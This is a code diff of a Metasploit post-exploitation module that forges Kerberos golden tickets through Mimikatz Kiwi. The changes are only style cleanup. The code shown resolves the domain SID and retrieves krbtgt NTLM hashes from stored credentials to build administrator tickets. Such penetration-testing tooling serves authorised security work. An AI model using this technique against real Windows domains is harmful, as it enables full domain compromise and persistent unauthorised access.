@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 require 'msf/core'
 require 'msf/core/post/windows/netapi'
 require 'msf/core/post/windows/kiwi'
@@ -13,12 +14,12 @@ class MetasploitModule < Msf::Post
     super(update_info(
       info,
       'Name'         => 'Windows Escalate Golden Ticket',
-      'Description'  => %q{
+      'Description'  => %q(
           This module will create a Golden Kerberos Ticket using the Mimikatz Kiwi Extension. If no
         options are applied it will attempt to identify the current domain, the domain administrator
         account, the target domain SID, and retrieve the krbtgt NTLM hash from the database. By default
         the well-known Administrator's groups 512, 513, 518, 519, and 520 will be applied to the ticket.
-        },
+        ),
       'License'      => MSF_LICENSE,
       'Author'       => [
         'Ben Campbell'
@@ -40,7 +41,8 @@ class MetasploitModule < Msf::Post
         OptString.new('Domain SID', [false, 'Domain SID']),
         OptInt.new('ID', [false, 'Target User ID']),
         OptString.new('GROUPS', [false, 'ID of Groups (Comma Seperated)'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run
@@ -133,26 +135,28 @@ class MetasploitModule < Msf::Post
     cch_referenced_domain_name = referenced_domain_name_buffer = 100
 
     res = client.railgun.advapi32.LookupAccountNameA(
-                               nil,
-                               domain,
-                               sid_buffer,
-                               cb_sid,
-                               referenced_domain_name_buffer,
-                               cch_referenced_domain_name,
-                               1)
+      nil,
+      domain,
+      sid_buffer,
+      cb_sid,
+      referenced_domain_name_buffer,
+      cch_referenced_domain_name,
+      1
+    )
 
     if !res['return'] && res['GetLastError'] == INSUFFICIENT_BUFFER
       sid_buffer = cb_sid = res['cbSid']
       referenced_domain_name_buffer = cch_referenced_domain_name = res['cchReferencedDomainName']
 
       res = client.railgun.advapi32.LookupAccountNameA(
-          nil,
-          domain,
-          sid_buffer,
-          cb_sid,
-          referenced_domain_name_buffer,
-          cch_referenced_domain_name,
-          1)
+        nil,
+        domain,
+        sid_buffer,
+        cb_sid,
+        referenced_domain_name_buffer,
+        cch_referenced_domain_name,
+        1
+      )
     elsif !res['return']
       return nil
     end
@@ -173,9 +177,10 @@ class MetasploitModule < Msf::Post
     krbtgt_hash = nil
 
     krbtgt_creds = Metasploit::Credential::Core.joins(:public, :private).where(
-        metasploit_credential_publics: { username: 'krbtgt' },
-        metasploit_credential_privates: { type: 'Metasploit::Credential::NTLMHash' },
-        workspace_id: myworkspace.id)
+      metasploit_credential_publics: { username: 'krbtgt' },
+      metasploit_credential_privates: { type: 'Metasploit::Credential::NTLMHash' },
+      workspace_id: myworkspace.id
+    )
 
     if krbtgt_creds
 
@@ -184,7 +189,7 @@ class MetasploitModule < Msf::Post
       elsif krbtgt_creds.count > 1
 
         # Can we reduce the list by domain...
-        krbtgt_creds_realm = krbtgt_creds.select { |c| c.realm.to_s.upcase == domain.upcase }
+        krbtgt_creds_realm = krbtgt_creds.select { |c| c.realm.to_s.casecmp(domain.upcase).zero? }
 
         # We have found a krbtgt hashes in our target domain
         if krbtgt_creds_realm.length == 1
@@ -193,7 +198,7 @@ class MetasploitModule < Msf::Post
           print_good("Using #{cred.realm}:#{cred.public.username}:#{krbtgt_hash}")
           return krbtgt_hash
         # We have found multiple krbtgt hashes in our target domain?!
-        elsif krbtgt_creds_realm.length > 0
+        elsif !krbtgt_creds_realm.empty?
           krbtgt_creds = krbtgt_creds_realm
         end
 
